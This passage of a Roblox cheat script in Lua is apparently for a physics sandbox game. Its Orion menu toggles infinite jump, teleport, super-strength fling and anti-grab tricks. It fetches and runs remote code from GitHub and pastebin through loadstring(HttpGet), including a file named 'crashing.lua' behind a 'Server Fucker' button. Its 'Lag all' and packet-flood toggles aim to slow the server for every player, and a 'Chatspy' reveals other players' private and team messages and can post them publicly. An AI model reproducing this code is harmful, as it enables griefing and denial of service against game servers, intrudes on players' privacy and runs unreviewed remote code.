        jumpPower = Value
        if loopJump then
            setJumpPower(jumpPower)
        end
    end
})

setJumpPower(jumpPower)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local localPlayer = Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local infiniteJumpEnabled = false

local function setInfiniteJumpEnabled(value)
    infiniteJumpEnabled = value
end

UserInputService.JumpRequest:Connect(function()
    if infiniteJumpEnabled and humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

local function onCharacterAdded(newCharacter)
    character = newCharacter
    humanoid = character:WaitForChild("Humanoid")
end

localPlayer.CharacterAdded:Connect(onCharacterAdded)

PlayerTab:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(Value)
        setInfiniteJumpEnabled(Value)
        if Value then
            print("Infinite Jump enabled")
        else
            print("Infinite Jump disabled")
        end
    end
})

PlayerTab:AddSection({ Name = "Spin Character" })

local spinning = false

local function startSpinning()
    while spinning do
        local char = localPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(1000), 0)
        end
        task.wait(0.1)
    end
end

PlayerTab:AddToggle({
    Name = "Spin Character",
    Default = false,
    Callback = function(Value)
        spinning = Value
        if spinning then
            task.spawn(startSpinning)
        end
    end
})

localPlayer.CharacterAdded:Connect(function()
    if spinning then
        task.spawn(startSpinning)
    end
end)

PlayerTab:AddSection({ Name = "Teleport (can tp in air a bit broken depends where u aim)" })

PlayerTab:AddBind({
    Name = "Teleport to Mouse (works for delta and works for all exe but the touch is annoying)",
    Default = teleportKey,
    Hold = false,
    Callback = function()
        local mouse = player:GetMouse()
        local targetPos = mouse.Hit and mouse.Hit.Position
        if targetPos and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 5, 0))
        end
    end
})

PlayerTab:AddButton({
    Name = "Teleport for mobile",
    Default = false,
    Callback = function()
        local mouse = player:GetMouse()
        local targetPos = mouse.Hit and mouse.Hit.Position
        if targetPos and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 5, 0))
        end
    end
})


local Section = PlayerTab:AddSection({
	Name = "Blobman Functions"
})

local loopActive = false
local teleportLoopActive = false
local seatLoopActive = false


local function startLoops()
    loopActive = true
    local player = game.Players.LocalPlayer
    local spawnedInToys = workspace:FindFirstChild(player.Name .. "SpawnedInToys")

    if not spawnedInToys then
        warn("SpawnedInToys não encontrado.")
        return
    end

    local creatureBlobman = spawnedInToys:WaitForChild("CreatureBlobman")
    local blobmanSeat = creatureBlobman:WaitForChild("VehicleSeat")
    local proximityPrompt = blobmanSeat:WaitForChild("ProximityPrompt")

    while loopActive do
        wait() 

        
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = blobmanSeat.CFrame
        end

        
        if proximityPrompt.Enabled then
            
            proximityPrompt:InputHoldBegin(nil)
            wait()
            proximityPrompt:InputHoldEnd(nil)
        end


        if not player or not player.Parent then
            break
        end
    end
end


local function stopLoops()
    loopActive = true
end


PlayerTab:AddToggle({
    Name = "Loop Seat On Blobman",
    Default = false,
    Callback = function(Value)
        if Value then
            startLoops()
        else
            stopLoops()
        end
    end    
})


local player = game.Players.LocalPlayer
local spawnedInToys = workspace:FindFirstChild(player.Name .. "SpawnedInToys")

if not spawnedInToys then
    OrionLib:MakeNotification({
        Name = "Erro!",
        Content = "SpawnedInToys não encontrado!",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    return
end

local trackedBlobmans = {}

local function trackBlobmans()
    for _, toy in ipairs(spawnedInToys:GetChildren()) do
        if toy.Name == "CreatureBlobman" and not trackedBlobmans[toy] then
            local grabbableHitbox = toy:FindFirstChild("GrabbableHitbox")
            if grabbableHitbox then
                trackedBlobmans[toy] = grabbableHitbox
                print("Novo Blobman detectado!")
            end
        end
    end
end

PlayerTab:AddToggle({
    Name = "Freeze Blobman",
    Default = false,  
    Callback = function(value)
        for _, grabbableHitbox in pairs(trackedBlobmans) do
            grabbableHitbox.Anchored = value
        end

        OrionLib:MakeNotification({
            Name = "Updated Anchor",
            Content = "The anchor was " .. (value and "enabled" or "disabled") .. " for all Blobmans.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        print("Anchor " .. (value and "enabled" or "disabled") .. " for all Blobmans")
    end    
})

local GrabTab = Window:MakeTab({Name = "Grab", Icon =  "rbxassetid://7733954884", PremiumOnly = false})

GrabTab:AddSlider({
    Name = "Super Strenght",
    Min = 400,
    Max = 10000,  
    Default = 400,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 100,
    ValueName = "Força",
    Callback = function(Value)
        strength = Value  
        print("Força atual: " .. strength)
    end    
})


GrabTab:AddToggle({
    Name = "Enable Super Strenght",
    Default = false,
    Callback = function(Value)
        fling = Value  
        print("Força habilitada: " .. tostring(fling))
    end    
})


Workspace.ChildAdded:Connect(function(model)
    if model.Name == "GrabParts" then
        local part_to_impulse = model:FindFirstChild("GrabPart") and model["GrabPart"]["WeldConstraint"].Part1

        if part_to_impulse then
            print("Part found!")

            local velocityObj = Instance.new("BodyVelocity", part_to_impulse)
            
            model:GetPropertyChangedSignal("Parent"):Connect(function()
                if not model.Parent then
                    if fling then
                        print("Launched!")
                        velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        velocityObj.Velocity = Workspace.CurrentCamera.CFrame.lookVector * strength
                        Debris:AddItem(velocityObj, 1)
                    else
                        velocityObj.MaxForce = Vector3.new(0, 0, 0)
                        Debris:AddItem(velocityObj, 1)
                        print("Cancel Launch!")
                    end
                end
            end)
        end
    end
end)


GrabTab:AddParagraph("W", "Grab Add")



GrabTab:AddToggle({
    Name = "Poison Grab",
    Default = false,
    Save = true,
    Color = Color3.fromRGB(240, 0, 0),
    Flag = "PoisonGrab",
    Callback = function(enabled)
        if enabled then
            poisonGrabCoroutine = coroutine.create(function() grabHandler("poison") end)
            coroutine.resume(poisonGrabCoroutine)
        else
            if poisonGrabCoroutine then
                coroutine.close(poisonGrabCoroutine)
                poisonGrabCoroutine = nil
                for _, part in pairs(poisonHurtParts) do
                    part.Position = Vector3.new(0, -200, 0)
                end
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "Radioactive Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = true,
    Flag = "RadioactiveGrab",
    Callback = function(enabled)
        if enabled then
            ufoGrabCoroutine = coroutine.create(function() grabHandler("radioactive") end)
            coroutine.resume(ufoGrabCoroutine)
        else
            if ufoGrabCoroutine then
                coroutine.close(ufoGrabCoroutine)
                ufoGrabCoroutine = nil
                for _, part in pairs(paintPlayerParts) do
                    part.Position = Vector3.new(0, -200, 0)
                end
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "Fire Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = true,
    Flag = "FireGrab",
    Callback = function(enabled)
        if enabled then
            fireGrabCoroutine = coroutine.create(fireGrab)
            coroutine.resume(fireGrabCoroutine)
        else
            if fireGrabCoroutine then
                coroutine.close(fireGrabCoroutine)
                fireGrabCoroutine = nil
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "No-clip Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = true,
    Flag = "NoclipGrab",
    Callback = function(enabled)
        if enabled then
            noclipGrabCoroutine = coroutine.create(noclipGrab)
            coroutine.resume(noclipGrabCoroutine)
        else
            if noclipGrabCoroutine then
                coroutine.close(noclipGrabCoroutine)
                noclipGrabCoroutine = nil
            end
        end
    end
})

local Tab = Window:MakeTab({
Name = "Invincibility",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Section = Tab:AddSection({
Name = "Anti"
})



Tab:AddButton({
Name = "Anti Grab",
Callback = function()
local PS = game:GetService("Players")
local Player = PS.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RS = game:GetService("ReplicatedStorage")
local CE = RS:WaitForChild("CharacterEvents")
local R = game:GetService("RunService")
local BeingHeld = Player:WaitForChild("IsHeld")
local PlayerScripts = Player:WaitForChild("PlayerScripts")

--[[ Remotes ]]
local StruggleEvent = CE:WaitForChild("Struggle")

--[[ Anti-Explosion ]]
workspace.DescendantAdded:Connect(function(v)
if v:IsA("Explosion") then
v.BlastPressure = 0
end
end)

--[[ Anti-grab ]]
local initialPosition -- Variable to store the initial position

BeingHeld.Changed:Connect(function(C)
if C == true then
local char = Player.Character

if BeingHeld.Value == true then
local Event
Event = R.RenderStepped:Connect(function()
if BeingHeld.Value == true then
char["HumanoidRootPart"].AssemblyLinearVelocity = Vector3.new()
StruggleEvent:FireServer(Player)
elseif BeingHeld.Value == false then
Event:Disconnect()
end
end)

-- Store the initial position when grabbed
initialPosition = char.HumanoidRootPart.Position
end
end
end)

local function reconnect()
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildWhichIsA("Humanoid") or Character:WaitForChild("Humanoid")
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

HumanoidRootPart:WaitForChild("FirePlayerPart"):Remove()

Humanoid.Changed:Connect(function(C)
if C == "Sit" and Humanoid.Sit == true then
if Humanoid.SeatPart ~= nil and tostring(Humanoid.SeatPart.Parent) == "CreatureBlobman" then
elseif Humanoid.SeatPart == nil then
Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
Humanoid.Sit = false
end
end
end)
end

reconnect()

Player.CharacterAdded:Connect(reconnect)

-- Function to teleport the player back to the initial position when grabbed
local function teleportToInitialPosition()
if initialPosition then
local Character = Player.Character
if Character then
local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
if HumanoidRootPart then
HumanoidRootPart.CFrame = CFrame.new(initialPosition)
end
end
end
end

-- Connect the teleport function to the StruggleEvent
StruggleEvent.OnClientEvent:Connect(teleportToInitialPosition)

end
})

Tab:AddButton({
Name = "Anti Lag",
Callback = function()
game.ReplicatedStorage.GrabEvents.CreateGrabLine:Destroy()
end
})

Tab:AddToggle({
    Name = "Self-Defense Kick - Silent",
    Default = false,
    Save = true,
    Color = Color3.fromRGB(240, 0, 0),
    Flag = "SelfDefenseKick",
    Callback = function(enabled)
        if enabled then
            autoDefendKickCoroutine = coroutine.create(function()
                while enabled do
                    local character = localPlayer.Character
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        local humanoidRootPart = character.HumanoidRootPart
                        local head = character:FindFirstChild("Head")
                        if head then
                            local partOwner = head:FindFirstChild("PartOwner")
                            if partOwner then
                                local attacker = Players:FindFirstChild(partOwner.Value)
                                if attacker and attacker.Character then
                                    Struggle:FireServer()
                                    SetNetworkOwner:FireServer(attacker.Character.HumanoidRootPart.FirePlayerPart, attacker.Character.HumanoidRootPart.FirePlayerPart.CFrame)
                                    task.wait(0.1)
                                    if not attacker.Character.HumanoidRootPart.FirePlayerPart:FindFirstChild("BodyVelocity") then
                                        local bodyVelocity = Instance.new("BodyVelocity")
                                        bodyVelocity.Name = "BodyVelocity"
                                        bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        bodyVelocity.Velocity = Vector3.new(0, 20, 0)
                                        bodyVelocity.Parent = attacker.Character.HumanoidRootPart.FirePlayerPart
                                    end
                                end
                            end
                        end
                    end
                    wait(0.02)
                end
            end)
            coroutine.resume(autoDefendKickCoroutine)
        else
            if autoDefendKickCoroutine then
                coroutine.close(autoDefendKickCoroutine)
                autoDefendKickCoroutine = nil
            end
        end
    end
})

    Tab:AddToggle({
    Name = "Self-Defense - Air Suspend",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = true,
    Flag = "SelfDefenseAirSuspend",
    Callback = function(enabled)
        if enabled then
            autoDefendCoroutine = coroutine.create(function()
                while wait(0.02) do
                    local character = localPlayer.Character
                    if character and character:FindFirstChild("Head") then
                        local head = character.Head
                        local partOwner = head:FindFirstChild("PartOwner")
                        if partOwner then
                            local attacker = Players:FindFirstChild(partOwner.Value)
                            if attacker and attacker.Character then
                                Struggle:FireServer()
                                SetNetworkOwner:FireServer(attacker.Character.Head or attacker.Character.Torso, attacker.Character.HumanoidRootPart.FirePlayerPart.CFrame)
                                task.wait(0.1)
                                local target = attacker.Character:FindFirstChild("Torso")
                                if target then
                                    local velocity = target:FindFirstChild("l") or Instance.new("BodyVelocity")
                                    velocity.Name = "l"
                                    velocity.Parent = target
                                    velocity.Velocity = Vector3.new(0, 50, 0)
                                    velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                    Debris:AddItem(velocity, 100)
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(autoDefendCoroutine)
        else
            if autoDefendCoroutine then
                coroutine.close(autoDefendCoroutine)
                autoDefendCoroutine = nil
            end
        end
    end
})

Tab:AddToggle({
    Name = "AntiLag v2",
    Default = false,
    Callback = function(Value)
        antiLagT = Value
        antiLagF() -- Assure-toi que la fonction antiLagF() est bien définie quelque part
    end
})


Tab:AddToggle({
    Name = "AntiSticky",
    Default = false,
    Callback = function(Value)
        antiStickyT = Value
        antiStickyF()
    end
})



Tab:AddToggle({
    Name = "AutoGucci",
    Default = false,
    Callback = function(Value)
        autoGucciT = Value
        if autoGucciT then
            spawnBlobmanF()
            task.wait(1.1)
            if not sitJumpT then
                coroutine.wrap(sitJumpF)()
                sitJumpT = true
            end
            coroutine.wrap(ragdollLoopF)()
        else
            sitJumpT = false
        end
    end
})


Tab:AddToggle({
    Name = "AntiBlob",
    Default = false,
    Callback = function(Value)
        antiBlob1T = Value
        antiBlob1F()
    end
})


Tab:AddToggle({
    Name = "AntiGrabAnchor",
    Default = false,
    Callback = function(Value)
        antiGrab1AnchorT = Value
    end
})


Tab:AddToggle({
    Name = "Anti Blobman",
    Default = false,
    Callback = toggleProtections
})
function resetPositionIfNeeded()
    if _G.antiBlobmanActive and localPlayer.Character then
        local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart and BeingHeld.Value then
            local distanceMoved = (humanoidRootPart.Position - _G.initialPosition).Magnitude
            if distanceMoved > _G.grabDistanceThreshold then
                resetVelocityAndPosition(humanoidRootPart)
            end
        end
    end
end

RunService.Heartbeat:Connect(resetPositionIfNeeded)


local  function setupAntiExplosion(character)
     local partOwner = character:WaitForChild("Humanoid"):FindFirstChild("Ragdolled")
     if partOwner then
         local partOwnerChangedConn
         partOwnerChangedConn = partOwner:GetPropertyChangedSignal("Value"):Connect(function()
             if partOwner.Value then
                 for _, part in ipairs(character:GetChildren()) do
                     if part:IsA("BasePart") then
                         part.Anchored = true
                     end
                 end
             else
                 for _, part in ipairs(character:GetChildren()) do
                     if part:IsA("BasePart") then
                         part.Anchored = false
                     end
                 end
             end
         end)
         antiExplosionConnection = partOwnerChangedConn
     end
 end
 
 Tab:AddToggle({
     Name = "Anti Explosion",
     Default = false,
     Callback = function(enabled)
         local localPlayer = game.Players.LocalPlayer
 
         if enabled then
             if localPlayer.Character then
                 setupAntiExplosion(localPlayer.Character)
             end
           local  characterAddedConn = localPlayer.CharacterAdded:Connect(function(character)
                 if antiExplosionConnection then
                     antiExplosionConnection:Disconnect()
                 end
                 setupAntiExplosion(character)
             end)
         else
             if antiExplosionConnection then
                 antiExplosionConnection:Disconnect()
                 antiExplosionConnection = nil
             end
             if characterAddedConn then
                 characterAddedConn:Disconnect()
                 local characterAddedConn = nil
             end
         end
     end
 })

local Tab = Window:MakeTab({
Name = "Blobman",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Section = Tab:AddSection({
Name = "Server Fucker"
})



Tab:AddParagraph("WARNING","make sure to ride the blobman BEFORE looping, you will go flying into space. THERE IS NO WHITELIST FOR GOD BLOBMAN LOOP")

Tab:AddButton({
Name = "God Blobman Loop All",
CurrentValue = false,
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cooldawg123/FTAP/refs/heads/main/crashing.lua",true))()
end
})

    Tab:AddToggle({
    Name = "BlobLoopServer",
    CurrentValue = false,
    Callback = function(Value)
        blobLoopServerT = Value
        updateBlobLoopServerF()
    end
})

local loopTab = Window:MakeTab({
	Name = "Loop Tools",
	Icon = "rbxassetid://12345678",
	PremiumOnly = false
})



loopPlayerDropdown = loopTab:AddDropdown({
	Name = "PlayerLoop",
	CurrentOption = {},
	MultipleOptions = true,
	Options = getPlayerList(),
	Default = function(Options)
		playersInLoop1V = Options
	end
})

game.Players.PlayerAdded:Connect(function(player)
    if loopPlayerDropdown then 
        loopPlayerDropdown:Refresh(getPlayerList(), true)  
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    if loopPlayerDropdown then 
        loopPlayerDropdown:Refresh(getPlayerList(), true)  
    end
end)

loopTab:AddToggle({
	Name = "BlobLoop",
	Default = false,
	Callback = function(Value)
        blobLoopT = Value
        if blobLoopT then
            for i, e in ipairs(playersInLoop1V) do
                table.insert(playersInLoop2V, e:match("^(.-) %("))
            end
            loopPlayerBlobF()
        elseif not blobLoopT then
            table.clear(playersInLoop2V)
            loopPlayerBlobF()
        end
    end
})



local Tab = Window:MakeTab({
Name = "Fun",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Section = Tab:AddSection({
Name = "Spiderman"
})

Tab:AddLabel("(reset to cancel effects)")


Tab:AddButton({
Name = "Walk on walls",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end
})

local Tab = Window:MakeTab({
Name = "Lag",
Icon = "rbxassetid://15295877087",
PremiumOnly = false
})

Tab:AddToggle({
    Name = "Lag all",
    CurrentValue = false,
    Callback = function(Value)
        lagT = Value
        lagF()
    end
})

Tab:AddTextbox({
    Name = "Lines per seconds",
    Default = "50", -- doit être une string dans Orion
    TextDisappear = false,
    Callback = function(Value)
        linesV = tonumber(Value) -- convertir en nombre si nécessaire
    end
})

Tab:AddToggle({
    Name = "Ping",
    CurrentValue = false,
    Callback = function(Value)
        pingT = Value
        pingF()
    end
})

    Tab:AddTextbox({
    Name = "Packets",
    Default = "300", -- valeur par défaut (en string)
    TextDisappear = false, -- comme RemoveTextAfterFocusLost = false
    Callback = function(Value)
        packetsV = tonumber(Value) -- conversion string ➜ number
    end
})

Tab:AddToggle({
    Name = "Shuriken Lag",
    CurrentValue = false,
    Callback = function(Value)
        shurikenLagServerT = Value
        shurikenLagServerF()
    end
})

local Tab = Window:MakeTab({
Name = "Spy",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Section = Tab:AddSection({
Name = "Chatspy"
})

Tab:AddLabel("Chat “/spy”to enable/disable")

Tab:AddButton({
Name = "Chatspy",
Callback = function()
enabled = true --chat "/spy to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
Color = Color3.fromRGB(0,255,255);
Font = Enum.Font.SourceSansBold;
TextSize = 18;
}
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance
local function onChatted(p,msg)
if _G.chatSpyInstance == instance then
if p==player and msg:lower():sub(1,4)=="/spy" then
enabled = not enabled
wait(0.3)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
elseif enabled and (spyOnMyself==true or p~=player) then
msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
local hidden = true
local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
hidden = false
end
end)
wait(1)
conn:Disconnect()
if hidden and enabled then
if public then
saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
else
privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
end
end
end
end
end
for _,p in ipairs(Players:GetPlayers()) do
p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end
})

Tab:AddButton({
Name = "Chatspy (Log Publicly)",
Callback = function()
enabled = true --chat "/spy to toggle!
spyOnMyself = true --if true will check your messages too
public = true --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
Color = Color3.fromRGB(0,255,255);
Font = Enum.Font.SourceSansBold;
TextSize = 18;
}
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance
local function onChatted(p,msg)
if _G.chatSpyInstance == instance then
if p==player and msg:lower():sub(1,4)=="/spy" then
enabled = not enabled
wait(0.3)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
elseif enabled and (spyOnMyself==true or p~=player) then
msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
local hidden = true
local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
hidden = false
end
end)
wait(1)
conn:Disconnect()
if hidden and enabled then
if public then
saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
else
privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
end
end
end
end
end
for _,p in ipairs(Players:GetPlayers()) do
p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end
})

local Tab = Window:MakeTab({
    Name = "Teleport",
    Icon = "rbxassetid://4483345998", 
    PremiumOnly = false
})

local Section = Tab:AddSection({
Name = "Teleport"
})


Tab:AddDropdown({
Name = "Select Player",
Default = getAllPlayers(),
Options = getAllPlayers(),
Callback = function(value)
selectedPlayer = value
end    
})

Tab:AddButton({
    Name = "Teleport to Player",
    Callback = function()
        if selectedPlayer then
            local targetPlayer = Players:FindFirstChild(selectedPlayer)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                else
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Your character's HumanoidRootPart was not found.",
                        Time = 5
                    })
                end
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Target player's HumanoidRootPart not found.",
                    Time = 5
                })
            end
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "No player selected.",
                Time = 5
            })
        end
    end
})

local antiTab = Window:MakeTab({
	Name = "Anti Defense ",
	Icon = "rbxassetid://7734058345",
	PremiumOnly = false
})

_G.toggleActiveAntiGrabAndBlobman = false
_G.autoStruggleCoroutine = nil
_G.initialPosition = nil
_G.teleportDistanceThreshold = 10
_G.velocityThreshold = 1000
_G.grabDistanceThreshold = 10
_G.connections = {}
_G.antiKillEnabled = false
_G.blobmanLoop = nil
_G.whitelistedPlayers = {
    "ROBLOX6666JM",
    "thecrazyteen"
}

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CharacterEvents = ReplicatedStorage:WaitForChild("CharacterEvents")
local Struggle = CharacterEvents:WaitForChild("Struggle")
local localPlayer = Players.LocalPlayer
local BeingHeld = localPlayer:WaitForChild("IsHeld")

local function isWhitelisted(playerName)
    for _, name in ipairs(_G.whitelistedPlayers) do
        if name == playerName then
            return true
        end
    end
    return false
end

local function disconnectAll()
    for _, connection in pairs(_G.connections) do
        if connection then
            connection:Disconnect()
        end
    end
    _G.connections = {}
end


local function removeAllBlobmans()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local otherSpawnedInToys = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
            if otherSpawnedInToys then
                for _, blobman in ipairs(otherSpawnedInToys:GetChildren()) do
                    if blobman:IsA("Model") and blobman.Name == "CreatureBlobman" then
                        blobman:Destroy()
                    end
                end
            end
        end
    end
end


local function monitorBlobmans()
    if _G.blobmanLoop then
        _G.blobmanLoop:Disconnect()
    end

    _G.blobmanLoop = RunService.Heartbeat:Connect(function()

        removeAllBlobmans()
    end)
end

local function stopMonitoringBlobmans()
    if _G.blobmanLoop then
        _G.blobmanLoop:Disconnect()
        _G.blobmanLoop = nil
    end
end

local function setupSitAndRemoveCreatureBlobman()
    removeAllBlobmans()
    monitorBlobmans()
end

local function startAutoStruggle()
    _G.autoStruggleCoroutine = RunService.Heartbeat:Connect(function()
        local character = localPlayer.Character
        if character and character:FindFirstChild("Head") then
            local partOwner = character.Head:FindFirstChild("PartOwner")
            if partOwner and not isWhitelisted(partOwner.Value) then
                Struggle:FireServer()
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Anchored = true
                    end
                end
                while BeingHeld.Value do
                    RunService.Heartbeat:Wait()
                end
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Anchored = false
                    end
                end
            end
        end
    end)
end

local function teleportToInitialPosition()
    if _G.toggleActiveAntiGrabAndBlobman and _G.initialPosition then
        local char = localPlayer.Character
        local humanoidRootPart = char and char:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.CFrame = CFrame.new(_G.initialPosition)
        end
    end
end

local function onThrow()
    if _G.toggleActiveAntiGrabAndBlobman then
        local char = localPlayer.Character
        local humanoidRootPart = char and char:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            local currentVelocity = humanoidRootPart.AssemblyLinearVelocity
            local distanceFromStart = (humanoidRootPart.Position - _G.initialPosition).Magnitude
            if currentVelocity.Magnitude > _G.velocityThreshold and distanceFromStart > _G.teleportDistanceThreshold then
                humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                humanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                teleportToInitialPosition()
            end
        end
    end
end

table.insert(_G.connections, RunService.RenderStepped:Connect(onThrow))

BeingHeld.Changed:Connect(function(isHeld)
    if _G.toggleActiveAntiGrabAndBlobman and isHeld then
        local char = localPlayer.Character
        local humanoidRootPart = char and char:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            _G.initialPosition = humanoidRootPart.Position
            local eventConnection
            eventConnection = RunService.RenderStepped:Connect(function()
                if BeingHeld.Value then
                    local partOwner = char.Head:FindFirstChild("PartOwner")
                    if partOwner and not isWhitelisted(partOwner.Value) then
                        local distanceMoved = (humanoidRootPart.Position - _G.initialPosition).Magnitude
                        if distanceMoved > _G.grabDistanceThreshold then
                            humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            humanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            Struggle:FireServer(localPlayer)
                        end
                    end
                else
                    eventConnection:Disconnect()
                end
            end)
            table.insert(_G.connections, eventConnection)
        end
    end
end)

local function antiKill()
    if _G.antiKillEnabled then
        local char = localPlayer.Character
        local humanoid = char and char:FindFirstChild("Humanoid")
        if humanoid and not isWhitelisted(localPlayer.Name) then
            humanoid.Health = math.huge
            humanoid.MaxHealth = math.huge
        end
    end
end

table.insert(_G.connections, RunService.Stepped:Connect(antiKill))

local function onHealthChanged()
